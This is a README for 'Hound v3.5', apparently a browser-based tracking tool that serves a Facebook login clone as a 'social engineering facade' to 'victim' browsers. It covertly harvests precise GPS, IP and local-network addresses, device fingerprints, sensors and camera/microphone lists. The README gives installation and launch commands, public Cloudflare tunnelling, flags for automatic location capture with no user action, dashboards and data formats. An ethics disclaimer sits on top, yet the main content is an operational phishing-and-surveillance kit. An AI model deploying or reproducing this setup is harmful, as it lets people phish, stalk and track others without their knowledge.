# 🐕 Hound v3.5 – Advanced Telemetry, OSINT & Device Intelligence Engine

[![Python Version](https://img.shields.io/badge/Python-3.9%2B-blue.svg)](https://www.python.org/)
[![FastAPI](https://img.shields.io/badge/Framework-FastAPI-009688.svg)](https://fastapi.tiangolo.com/)
[![Database](https://img.shields.io/badge/Database-SQLAlchemy%2BSQLite-red.svg)](https://www.sqlalchemy.org/)
[![3D Visualization](https://img.shields.io/badge/3D%20Engine-Three.js%2060FPS-black.svg)](https://threejs.org/)
[![Mapping](https://img.shields.io/badge/Maps-Leaflet%2BGoogle%20L24-green.svg)](https://leafletjs.com/)
[![License](https://img.shields.io/badge/License-GPL%20v3-blue.svg)](https://www.gnu.org/licenses/gpl-3.0)

**Original Concept & Base:** [TechChip / Hound](https://github.com/techchipnet/hound)  
**Refactored & Maintained by:** NRXQuantum (v3.5)

---

## ⚠️ Critical Disclaimer & Ethical Notice

> [!WARNING]
> **FOR EDUCATIONAL, AUTHORIZED PENETRATION TESTING, AND SECURITY RESEARCH PURPOSES ONLY**

```text
╔═══════════════════════════════════════════════════════════════════════════╗
║                         ETHICAL RESPONSIBILITY                            ║
║                                                                           ║
║ Knowledge is a trust. Technical capability ≠ Permission to misuse data.  ║
║ DO NOT use this tool to:                                                 ║
║  ✗ Stalk, surveil, or spy on individuals without explicit consent        ║
║  ✗ Capture data from targets unaware of data collection                  ║
║  ✗ Violate privacy laws, wiretapping statutes, or GDPR regulations       ║
║  ✗ Deploy maliciously or for financial gain                              ║
║                                                                           ║
║ Every user is solely accountable for their actions and legal compliance. ║
║ The developers assume ZERO LIABILITY for misuse.                         ║
╚═══════════════════════════════════════════════════════════════════════════╝
```

- **Use Only In:** Authorized security assessments, lab environments, or with explicit written consent
- **Comply With:** All applicable local, national, and international data protection & cybersecurity laws
- **Zero Liability:** Developers are not responsible for any legal, financial, or reputational harm from misuse

---

## 📖 Project Overview

**Hound v3.5** is a next-generation asynchronous telemetry harvesting & intelligence platform designed for:

- 🔒 **Authorized Penetration Testing** – Comprehensive client-side security assessment
- 🔬 **Digital Forensics Research** – Deep device fingerprinting & behavior analysis
- 🌐 **OSINT Intelligence** – Geolocation, network profiling, hardware reconnaissance
- 📊 **Device Intelligence** – GPU, CPU, battery, media codec detection via browser APIs

### What Makes Hound v3.5 Different?

| Feature | Hound (Original) | Hound v3.5 (Current) |
|---------|------------------|----------------------|
| **Backend** | PHP 7.x | **FastAPI (Async Python 3.9+)** + Uvicorn |
| **Data Storage** | `.txt` files, JSON dumps | **SQLite + SQLAlchemy ORM** + Rotating Logs |
| **Admin Interface** | Terminal logs only | **Full Web Dashboard** with Real-time Analytics |
| **Map Engine** | Google Maps link (static) | **Interactive Leaflet** + **4 Google Map Layers (Level 24 Zoom)** |
| **3D Visualization** | Basic WebSocket viewer | **60 FPS Three.js Renderer** + LERP Smoothing + Compass HUD |
| **Tunneling** | Manual Cloudflared | **Auto-Retry Tunneling** with Drop Recovery |
| **Lie Detection** | None | **Anti-Spoofing Engine** (UA vs GPU, Touch Points) |
| **Fingerprinting** | Canvas & Audio | **WebGPU, V8 Heap, Display Gamut, Emoji Sub-pixel, Math Quirks** |

---

## ✨ Core Capabilities & Intelligence Modules

### 1. 🚨 Advanced Spoofing & Lie Detection

Detects when clients misrepresent their identity:
- **User-Agent vs Hardware Mismatch** – Flags desktop UA running on Mali/Adreno (mobile GPU)
- **Touch Point Validation** – Validates reported touch points against platform type
- **Device Capability Inconsistency** – Detects contradictory hardware claims
- **Output:** Detailed spoofing report flagging confidence level

### 2. 🎮 Deep Hardware & Browser Intelligence

Comprehensive device profiling from a single page load:

| Category | What We Detect |
|----------|-----------------|
| **GPU/Graphics** | WebGL vendor/renderer, WebGPU adapter, Canvas fingerprint (SHA-256) |
| **CPU/Performance** | V8 heap limits, JavaScript engine benchmark, CPU core count hints |
| **Memory** | Device memory, shared array buffer availability |
| **Display** | Screen dimensions, pixel ratio, color gamut (sRGB/P3), Dark Mode preference |
| **Audio** | AudioContext frequency analyzer, H.264/VP9 codec support, TTS voices |
| **Media** | Camera/microphone enumeration, 4K/60FPS hardware decode capability |
| **Battery** | Charge level, charging state, estimated discharge time |
| **Sensors** | Accelerometer, gyroscope, magnetometer (if available) |
| **Fonts** | System font signatures (platform-specific detection) |
| **Client Hints** | User-Agent Client Hints (high-entropy device data) |

### 3. 🌐 Multi-Layer Geolocation & Network Intelligence

**GPS Telemetry (When Authorized):**
- Latitude, Longitude, Altitude (±0.5m precision)
- Accuracy radius, heading, and velocity
- Real-time 3D positioning via WebSocket

**IP Geolocation (Multi-Provider Fallback):**
- City, Region, Country, ISP, ASN
- Providers: FreeIPAPI → IPAPI → IPWhois (auto-retry)

**Network Leaks:**
- Local LAN IP via WebRTC ICE candidates
- STUN public IP leak detection
- Connection type & speed profiling

### 4. 🧭 Ultra-Smooth 60 FPS 3D Orientation Visualizer

Real-time device motion tracking:
- **High-Frequency Pipeline:** 70ms sensor updates
- **3D Phone Model:** Three.js rendering with materials & lighting
- **LERP Smoothing:** Linear interpolation + shortest-angle wrap-around fix (0° ↔ 360° handling)
- **Interactive Compass:** 8-point cardinal direction readout
- **Standalone Server:** `viewer_server.py` on `http://localhost:8082`
- **Zero Client Lag:** Ultra-fast WebSocket broadcast (15ms cycle time)

### 5. 📊 Centralized Admin Dashboard

**Real-Time Intelligence Hub:**
- Target profile cards grouped by unique `hound_uid` (persistent user session)
- **Interactive Leaflet Map** with 4 Google map layers:
  - 🗺️ Streets (Default)
  - 🌐 Hybrid (Satellite + Labels)
  - 🛰️ Satellite (Imagery Only)
  - ⛰️ Terrain (Elevation)
- **Level 24 Deep Zoom** for precise location confirmation
- GPS vs. IP Geolocation color-coded markers (Green = GPS, Blue = IP)
- Click to zoom, double-click for full JSON telemetry dump
- Auto-refresh every 3 seconds (only when tab is in focus)
- Statistics panel: Unique targets, GPS hits, connection status

### 6. 🧠 Browser Fingerprinting (15+ Vectors)

- **Canvas Fingerprint** – SHA-256 hash of rendered text
- **WebGL** – GPU model, vendor, extensions list
- **WebGPU** – GPU adapter & memory info
- **Audio Context** – Frequency analyzer signature
- **V8 Heap** – JavaScript engine memory limits
- **Display Gamut** – Color space (sRGB, P3, Rec2020)
- **Emoji Metrics** – Sub-pixel rendering signature
- **Math Quirks** – Floating-point precision hash (platform-specific)
- **Fonts** – System font availability (Windows/Mac/Linux detection)
- **Client Rects** – DOM measurement API consistency
- **Media Devices** – Camera/Microphone enumeration
- **USB Devices** – Connected USB hardware (WebUSB API)

---

## 📁 Repository Architecture

```
hound/
├── app/                                  # FastAPI Backend
│   ├── __init__.py                       # Package initializer
│   ├── main.py                           # FastAPI app, CORS, routers, static mounts
│   ├── webhook.py                        # Telemetry ingestion endpoint (/webhook.php)
│   ├── database.py                       # SQLAlchemy ORM, CollectedData model
│   ├── models.py                         # Pydantic validation schemas (25+ fields)
│   └── utils.py                          # Log rotation, human-readable formatting, file I/O
│
├── static/                               # Frontend & Telemetry Harvester
│   ├── index.html                        # Deployment target (Facebook login clone)
│   ├── admin.html                        # Admin dashboard (Leaflet + JSON modal)
│   ├── telemetry.js                      # 15+ intelligence modules (~625 lines)
│   ├── video_index.html                  # Alternative capture template
│   ├── script.js                         # UI helper functions
│   └── style.css                         # Dark theme styling
│
├── config.py                             # Configuration manager (env-based)
├── .env                                  # Environment variables (example)
├── hound.sh                              # Master bash deployment script
├── viewer_server.py                      # Standalone 60 FPS 3D viewer (aiohttp)
├── requirements.txt                      # Python dependencies
├── data/                                 # SQLite database & JSON storage (auto-created)
├── logs/                                 # Rotating log files (auto-created)
│   ├── data.txt                          # Main telemetry log (human-readable)
│   ├── orientation.log                   # Sensor motion tracking
│   └── targets/                          # Per-user profile logs
└── LICENSE                               # GPL-3.0

```

---

## 🛠️ Installation & Setup

### Prerequisites

- **Python 3.9+** (Required)
- **pip** (Python package manager)
- **Cloudflared** (Optional, for internet tunneling)
- **Modern Browser** (Chrome/Edge/Firefox/Safari with WebGL support)

### Step 1: Clone Repository

```bash
git clone https://github.com/NRXQuantum/hound.git
cd hound
```

### Step 2: Create Virtual Environment (Recommended)

```bash
# Linux / macOS
python3 -m venv venv
source venv/bin/activate

# Windows
python -m venv venv
venv\Scripts\activate
```

### Step 3: Install Dependencies

```bash
pip install -r requirements.txt
```

### Step 4: Grant Execute Permissions

```bash
chmod +x hound.sh viewer_server.py
```

### Step 5: Configure Environment (Optional)

Create/edit `.env` for custom settings:

```env
DEBUG=false
PORT=8000
MODE=local
DATABASE_URL=sqlite:///./hound.db
GPS_AUTO=true
COOKIE_TRACK=false
AUTO_COLLECT=true
MAX_LOG_SIZE=10485760
BACKUP_COUNT=5
```

---

## 🚀 Running Hound v3.5

### Method 1: Using Master Deployment Script (Recommended)

The `hound.sh` script handles server startup, worker management, and Cloudflare tunneling.

#### Local Mode (Localhost Only)
```bash
./hound.sh --local --port 8000
```

#### Internet Mode (Public via Cloudflare Tunnel)
```bash
./hound.sh --internet --port 8000
```

#### With Auto GPS Collection & Auto Telemetry
```bash
./hound.sh --internet --gps --auto
```

#### Advanced: All Options Combined
```bash
./hound.sh --internet --port 8765 --gps --cookie --auto --viewer
```

### Supported CLI Flags

| Flag | Description |
|------|-------------|
| `--local` | Bind to localhost only (default) |
| `--internet` | Create public Cloudflare tunnel (`trycloudflare.com`) |
| `-p, --port <PORT>` | Custom port (default: `8000`) |
| `--gps` | Auto-request GPS location from target |
| `--cookie` | Enable persistent session cookie tracking |
| `--auto` | Instant telemetry harvest (no manual trigger) |
| `--viewer` | Flag for 3D viewer readiness |

### Method 2: Manual Python Startup

If you prefer to start components individually:

#### Start FastAPI Backend
```bash
python3 -m app.main
```

- **Capture Page:** http://localhost:8000
- **Admin Dashboard:** http://localhost:8000/admin
- **API Docs:** http://localhost:8000/docs

#### Start 3D Orientation Viewer (Separate Terminal)
```bash
python3 viewer_server.py
```

- **3D Viewer:** http://localhost:8082

---

## 📊 Monitoring & Log Analysis

### Real-Time Terminal Monitoring

```bash
# Stream incoming telemetry profiles (human-readable)
tail -f logs/data.txt

# Stream live device motion/gyroscope data
tail -f logs/orientation.log

# View full telemetry for specific target
cat logs/targets/usr_<USER_ID>.txt

# Monitor database activity (optional)
sqlite3 data/hound.db "SELECT * FROM collected_data ORDER BY timestamp DESC LIMIT 10;"
```

### Log Format Examples

**Telemetry Profile** (`logs/data.txt`):
```
======================================================================
🆔 Target: usr_1693782450_a2f8c9
📅 Timestamp: 2026-09-03 14:32:18
----------------------------------------
🚨 SPOOFING / LIES DETECTED!
  ⚠️ User-Agent claims Windows but detected Mali GPU (Android)

📱 BASIC DEVICE SPECIFICATIONS
  userAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
  platform: Win32
  hardwareConcurrency: 8
  deviceMemory: 16 GB

⚡ CPU BENCHMARK & PERFORMANCE
  score: 2847.5
  iterations: 1000000

📍 PRECISE GPS COORDINATES
  Latitude: 23.8103
  Longitude: 90.4125
  Google Maps: https://www.google.com/maps?q=23.8103,90.4125
  Accuracy: 5.23m
======================================================================
```

**Sensor Telemetry** (`logs/orientation.log`):
```
[2026-09-03T14:32:19.234Z] [usr_a2f8c9] Alpha: 45.2 Beta: -12.5 Gamma: 3.1
[2026-09-03T14:32:22.456Z] [usr_a2f8c9] Alpha: 46.1 Beta: -13.2 Gamma: 2.8
```

### Database Queries

```bash
# List all collected profiles
sqlite3 data/hound.db "SELECT user_id, timestamp, device_info FROM collected_data;"

# Find profiles with GPS data
sqlite3 data/hound.db "SELECT user_id, gps_data FROM collected_data WHERE gps_data IS NOT NULL;"

# Export as JSON
sqlite3 data/hound.db ".mode json" "SELECT * FROM collected_data LIMIT 50;" > export.json
```

---

## ⚙️ Configuration Guide

### Environment Variables (.env)

| Variable | Default | Description |
|----------|---------|-------------|
| `DEBUG` | `false` | Enable verbose logging & hot reload |
| `PORT` | `8000` | FastAPI server port |
| `MODE` | `local` | `local` or `internet` (tunnel) |
| `DATABASE_URL` | `sqlite:///./hound.db` | SQLAlchemy connection string |
| `GPS_AUTO` | `true` | Auto-request GPS on page load |
| `COOKIE_TRACK` | `false` | Persistent session tracking via cookies |
| `AUTO_COLLECT` | `true` | Instant telemetry on page load (no user action) |
| `MAX_LOG_SIZE` | `10485760` | Max log file size (bytes) before rotation |
| `BACKUP_COUNT` | `5` | Number of rotated log backups to keep |
| `ALLOWED_ORIGINS` | `*` | CORS allowed origins (comma-separated) |
| `RATE_LIMIT` | `100/minute` | Rate limiting per IP |

### Programmatic Configuration (Python)

Edit `config.py` to modify:

```python
class Config:
    DEBUG = False
    DATABASE_URL = "sqlite:///./hound.db"
    ALLOWED_ORIGINS = ["http://localhost:8000"]
    GPS_AUTO = True
    COOKIE_TRACK = False
    AUTO_COLLECT = True
```

---

## 📡 API Reference

### Webhook Endpoint: `/webhook.php`

**POST** request receives telemetry data:

```bash
curl -X POST http://localhost:8000/webhook.php \
  -H "Content-Type: application/json" \
  -d '{
    "userId": "user_12345",
    "deviceInfo": { "userAgent": "...", "platform": "..." },
    "gps": { "latitude": 23.8103, "longitude": 90.4125, "accuracy": 5.23 },
    "orientation": { "alpha": 45.2, "beta": -12.5, "gamma": 3.1 }
  }'
```

### Admin API: `/api/targets`

**GET** returns all collected profiles:

```bash
curl http://localhost:8000/api/targets | jq .
```

Response:
```json
[
  {
    "id": "550e8400-e29b-41d4-a716-446655440000",
    "user_id": "usr_1693782450_a2f8c9",
    "timestamp": "2026-09-03 14:32:18",
    "device_info": { ... },
    "gps_data": { "latitude": 23.8103, "longitude": 90.4125, ... },
    "ip_info": { "ip": "203.0.113.42", "city": "Dhaka", ... },
    "canvas_fingerprint": "a1b2c3d4e5f6..."
  }
]
```

### Config Endpoint: `/config.json`

**GET** returns runtime configuration:

```bash
curl http://localhost:8000/config.json
```

---

## 🔄 Telemetry Pipeline & Workflow

```
┌─────────────────────────────────────────────────────────────────┐
│                    TARGET BROWSER (Victim)                       │
│  ┌──────────────────────────────────────────────────────────┐   │
│  │ index.html (Facebook login clone)                        │   │
│  │  └─ telemetry.js (15+ intelligence modules)             │   │
│  │      ├─ Canvas Fingerprinting                           │   │
│  │      ├─ WebGL/WebGPU Detection                          │   │
│  │      ├─ GPS Geolocation (if allowed)                    │   │
│  │      ├─ IP Geolocation (multi-provider)                 │   │
│  │      ├─ Device Motion Sensors (60 FPS WebSocket)        │   │
│  │      ├─ Battery Status, Network Type                    │   │
│  │      ├─ Media Device Enumeration                        │   │
│  │      └─ Spoofing Detection Logic                        │   │
│  └──────────────────────────────────────────────────────────┘   │
└───────────────────────┬──────────────────────────────────────────┘
                        │ POST /webhook.php (JSON)
                        │
┌───────────────────────▼──────────────────────────────────────────┐
│                    FASTAPI BACKEND (Python)                       │
│  ┌──────────────────────────────────────────────────────────┐   │
│  │ webhook.py (Telemetry Ingestion)                         │   │
│  │  ├─ Parse incoming JSON payload                         │   │
│  │  ├─ Validate with Pydantic models                       │   │
│  │  ├─ Detect client IP (CF-Connecting-IP fallback)        │   │
│  │  ├─ Cache sensor data (for 3D viewer)                   │   │
│  │  └─ Smart throttling (3s for logs, real-time for 3D)   │   │
│  │                                                          │   │
│  │ Processing:                                              │   │
│  │  ├─ Rotate logs (10MB max per file)                     │   │
│  │  ├─ Human-readable formatting                           │   │
│  │  ├─ Per-user JSON profiles (logs/targets/)              │   │
│  │  └─ SQLite persistence (collected_data table)           │   │
│  └──────────────────────────────────────────────────────────┘   │
└──────────────┬──────────────────┬──────────────────────────────────┘
               │                  │
      ┌────────▼────────┐  ┌──────▼────────────┐
      │  logs/data.txt  │  │ logs/orientation  │
      │  (Human-readable)│  │.log (15ms updates)│
      └─────────────────┘  └───────────────────┘
                │
        ┌───────▼─────────┐
        │ ADMIN DASHBOARD │
        │ (/admin)        │
        │ - Leaflet Map   │
        │ - Target Cards  │
        │ - JSON Modal    │
        └─────────────────┘
```

---

## 🧠 Telemetry Data Structures

### Complete Webhook Payload Example

```json
{
  "userId": "usr_1693782450_a2f8c9",
  "timestamp": "2026-09-03T14:32:18.234Z",
  
  "deviceInfo": {
    "userAgent": "Mozilla/5.0 (Linux; Android 14; SM-S9110)",
    "platform": "Linux aarch64",
    "language": "en-US",
    "hardwareConcurrency": 8,
    "deviceMemory": 8,
    "screenWidth": 1440,
    "screenHeight": 3120,
    "timezone": "Asia/Dhaka",
    "timezoneOffset": -360
  },
  
  "batteryInfo": {
    "charging": true,
    "level": 0.85,
    "chargingTime": 1800,
    "dischargingTime": Infinity
  },
  
  "networkInfo": {
    "connectionType": "5g",
    "effectiveType": "4g",
    "downlink": 25.5,
    "rtt": 15
  },
  
  "cpuBenchmark": {
    "score": 2847.5,
    "iterations": 1000000
  },
  
  "mediaCapabilities": {
    "h264_4k_60": true,
    "vp9_4k_60": true,
    "av1_1080p": true
  },
  
  "v8MemoryHeap": {
    "jsHeapSizeLimit": 2684354560,
    "totalJSHeapSize": 524288000
  },
  
  "webgpuFingerprint": {
    "adapter": "Mali-G710",
    "maxMemory": 4294967296
  },
  
  "gps": {
    "latitude": 23.8103,
    "longitude": 90.4125,
    "altitude": 12.5,
    "accuracy": 5.23,
    "speed": 2.5,
    "heading": 142.5
  },
  
  "ipInfo": {
    "ip": "203.0.113.42",
    "city": "Dhaka",
    "region": "Dhaka",
    "country": "BD",
    "org": "AS24560 Bangla Trac Limited",
    "timezone": "Asia/Dhaka"
  },
  
  "localIP": "192.168.1.105",
  "webrtcPublicIP": "203.0.113.42",
  
  "orientation": {
    "alpha": 45.2,
    "beta": -12.5,
    "gamma": 3.1,
    "timestamp": "2026-09-03T14:32:18.234Z"
  },
  
  "canvasFingerprint": "a1b2c3d4e5f6g7h8i9j0",
  "audioFingerprint": "x9y8z7w6v5u4t3s2r1q0",
  "fontsSignature": "Arial;Helvetica;Times New Roman;Courier New",
  
  "mediaDevices": [
    { "kind": "videoinput", "label": "Front Camera" },
    { "kind": "audioinput", "label": "Microphone" }
  ],
  
  "systemVoices": [
    "Google US English",
    "Microsoft Zira Desktop",
    "Alex"
  ],
  
  "lieDetection": {
    "isSpoofed": false,
    "detectedLies": []
  }
}
```

---

## 🎯 Use Cases & Scenarios

### Scenario 1: Authorized Penetration Testing
- Deploy to target's internal network
- Collect device inventory from employee browsers
- Identify outdated hardware/software
- Validate security policies (e.g., "no personal devices")

### Scenario 2: Digital Forensics Investigation
- Archive fingerprints for device attribution
- Cross-reference canvas hashes in evidence
- Correlate GPS tracks over time (if collected)
- Identify spoofed identities via spoofing detection

### Scenario 3: Security Research Lab
- Benchmark fingerprinting accuracy
- Test browser privacy mitigations
- Validate anti-tracking mechanisms
- Analyze real-world device diversity

### Scenario 4: Educational Demo
- Teach students about browser APIs & permissions
- Demonstrate modern web security risks
- Show fingerprinting techniques in action
- Illustrate geolocation data exposure

---

## 🔒 Security Best Practices

1. **Use HTTPS Only** – Deploy with SSL certificates (Cloudflare provides this)
2. **Validate Consent** – Obtain written authorization before deployment
3. **Secure Logs** – Restrict access to `logs/` directory (chmod 700)
4. **Database Security** – Use strong encryption for production databases
5. **Firewall Rules** – Limit admin panel (`/admin`) to whitelisted IPs
6. **Rotate Logs** – Enable automatic rotation to prevent disk exhaustion
7. **Disable Debug** – Set `DEBUG=false` in production
8. **Rate Limiting** – Adjust `RATE_LIMIT` to prevent abuse

---

## 🛠️ Troubleshooting & Common Issues

### Issue: "Cloudflare tunnel fails to connect"

**Solution:**
```bash
# Ensure cloudflared is installed
cloudflared --version

# If not installed:
curl https://pkg.cloudflare.com/cloudflare-release-ubuntu.gpg | sudo apt-key add -
sudo apt-get update && sudo apt-get install cloudflared

# Retry deployment
./hound.sh --internet
```

### Issue: "Port 8000 already in use"

**Solution:**
```bash
# Use different port
./hound.sh --local --port 9000

# Or kill existing process
lsof -i :8000 | grep LISTEN | awk '{print $2}' | xargs kill -9
```

### Issue: "GPS data not appearing in logs"

**Ensure:**
1. Browser has GPS permission granted
2. Location service is enabled on device
3. GPS accuracy is acceptable (< 100m)
4. Check browser console for permission errors

```bash
# Verify GPS requests in logs
grep -i "gps" logs/data.txt | head -5
```

### Issue: "3D Viewer shows 'Stream Offline'"

**Solution:**
```bash
# Ensure viewer_server.py is running
ps aux | grep viewer_server

# Restart it separately
python3 viewer_server.py

# Check if data file exists
ls -la data/live_orientation.json
```

### Issue: "Admin dashboard shows 'Fetching telemetry targets...'"

**Debug:**
```bash
# Check API endpoint manually
curl http://localhost:8000/api/targets

# Check database
sqlite3 data/hound.db "SELECT COUNT(*) FROM collected_data;"

# Check FastAPI logs for errors
tail -f logs/data.txt
```

---

## 📚 File Reference Guide

### Frontend Files

**`static/index.html`** – Deployment target (Facebook login clone)
- Social engineering facade
- Triggers automatic telemetry harvesting
- Responsive mobile/desktop layout

**`static/telemetry.js`** – Core Intelligence Engine (~625 lines)
- 15+ fingerprinting modules
- GPS/IP geolocation collection
- Sensor motion tracking (70ms updates)
- Spoofing detection logic
- WebSocket real-time connection

**`static/admin.html`** – Admin Dashboard
- Leaflet + 4 Google map layers (Level 24)
- Target profile cards (clickable, double-clickable)
- Real-time statistics & legend
- JSON modal for raw data export

**`static/style.css`** – Dark theme styling
- Modern UI with glassmorphism effects
- Mobile-responsive layout
- Accessibility-friendly colors

### Backend Files

**`app/main.py`** – FastAPI Application
- CORS middleware configuration
- Static file mounting
- `/admin`, `/api/targets`, `/config.json` endpoints
- Database initialization

**`app/webhook.py`** – Telemetry Ingestion
- POST `/webhook.php` handler
- Pydantic validation
- Data caching & throttling logic
- Database persistence

**`app/database.py`** – SQLAlchemy ORM
- `CollectedData` model definition
- Database engine setup
- Session factory

**`app/models.py`** – Pydantic Schemas
- `DeviceInfo`, `BatteryInfo`, `IpInfo`, `WebhookPayload`
- 85+ fields for validation & type-hinting

**`app/utils.py`** – Utility Functions
- Log rotation manager
- Human-readable formatting
- Per-user profile I/O
- Orientation JSON persistence

### Configuration Files

**`config.py`** – Central configuration
- Environment variable loading
- Directory initialization
- Config class with defaults

**`.env`** – Runtime environment
- Example: `PORT=8765`, `GPS_AUTO=true`
- Override `config.py` defaults

**`requirements.txt`** – Python dependencies
- FastAPI, Uvicorn, SQLAlchemy, Pydantic
- python-dotenv, aiofiles, aiohttp

### Deployment & Execution

**`hound.sh`** – Master bash script
- Orchestrates server startup
- Handles Cloudflare tunnel creation
- Auto-retry on connection failures
- Process management & cleanup

**`viewer_server.py`** – 3D Viewer WebSocket Server
- Standalone aiohttp application
- Broadcasts sensor data (15ms cycle)
- Serves Three.js 3D interface
- Compass HUD with cardinal directions

---

## 📈 Performance Metrics

### Resource Usage

- **Memory:** ~45MB base (Python + SQLite)
- **Disk:** ~1MB per 1000 telemetry records
- **CPU:** <5% idle, <15% under load
- **Network:** ~50KB per telemetry POST

### Throughput

- **Telemetry Ingestion:** 100+ requests/second (Uvicorn)
- **3D Viewer Broadcast:** 60 FPS (15ms cycle time)
- **Database Queries:** <100ms for 10k records
- **Log Rotation:** Automatic at 10MB per file

### Browser Compatibility

| Browser | Support | GPU Detection | GPS | Audio |
|---------|---------|---|---|---|
| Chrome/Edge | ✅ Full | ✅ WebGL/WebGPU | ✅ | ✅ |
| Firefox | ✅ Full | ✅ WebGL | ✅ | ✅ |
| Safari | ✅ Partial | ✅ WebGL | ✅ GPS limited | ✅ |
| Opera | ✅ Full | ✅ WebGL | ✅ | ✅ |

---

## 🤝 Contributing & Community

### How to Contribute

1. Fork the repository
2. Create a feature branch (`git checkout -b feature/amazing-feature`)
3. Commit your changes (`git commit -m 'Add amazing feature'`)
4. Push to the branch (`git push origin feature/amazing-feature`)
5. Open a Pull Request

### Reporting Issues

- Use GitHub Issues with detailed reproduction steps
- Include browser/OS information
- Attach relevant log files (`logs/data.txt`)
- Specify exact Hound version

### Feature Requests

- Check existing issues to avoid duplicates
- Describe use case and expected behavior
- Provide example scenarios

---

## 📄 License & Attribution

**Hound v3.5** is licensed under **GNU General Public License v3.0 (GPL-3.0)**

This project is a complete refactor & enhancement of the original **Hound** by TechChip:
- **Original Author:** TechChip (techchipnet)
- **v3.5 Maintainer:** NRXQuantum
- **License Compliance:** Full GPL-3.0 attribution maintained

### Third-Party Attributions

- **Three.js** – 3D graphics rendering (MIT License)
- **Leaflet** – Interactive mapping library (BSD-2-Clause)
- **FastAPI** – Web framework (MIT License)
- **SQLAlchemy** – Database ORM (MIT License)
- **Pydantic** – Data validation (MIT License)
- **aiohttp** – Async HTTP client/server (Apache 2.0)
- **Google Maps** – Tile layers (Google ToS)

---

## 📞 Support & Contact

- **Documentation:** Full README above ↑
- **Issue Tracker:** [GitHub Issues](https://github.com/NRXQuantum/hound/issues)
- **Discussions:** [GitHub Discussions](https://github.com/NRXQuantum/hound/discussions)
- **Email:** Contact via GitHub profile

---

## ⚡ Quick Reference Card

```bash
# Installation
git clone https://github.com/NRXQuantum/hound.git
cd hound && python3 -m venv venv && source venv/bin/activate
pip install -r requirements.txt && chmod +x hound.sh viewer_server.py

# Execution
./hound.sh --local                          # Local mode
./hound.sh --internet --port 8080           # Public tunnel
./hound.sh --internet --gps --auto          # Auto GPS collection

# Monitoring
tail -f logs/data.txt                       # Live telemetry
tail -f logs/orientation.log                # Sensor data
curl http://localhost:8000/api/targets      # API endpoint

# Endpoints
http://localhost:8000                       # Capture page
http://localhost:8000/admin                 # Admin dashboard
http://localhost:8082                       # 3D viewer
http://localhost:8000/docs                  # API documentation
```

---

## 🚀 Roadmap (v3.6+)

- [ ] GPU Memory Profiling (WebAssembly benchmarks)
- [ ] Behavioral Anomaly Detection (ML-based spoofing)
- [ ] End-to-End Encryption for sensitive payloads
- [ ] Multi-Language Support (i18n)
- [ ] Mobile App Integration (Native Android/iOS APIs)
- [ ] Real-time Alerting System (Discord/Telegram webhooks)
- [ ] Elasticsearch Support (Large-scale deployments)
- [ ] Docker Containerization & Kubernetes manifests

---

**Made with ❤️ by NRXQuantum | © 2026 | GPL-3.0 Licensed**

> ⚠️ **Remember:** With great power comes great responsibility. Use ethically. Respect privacy. Follow the law.
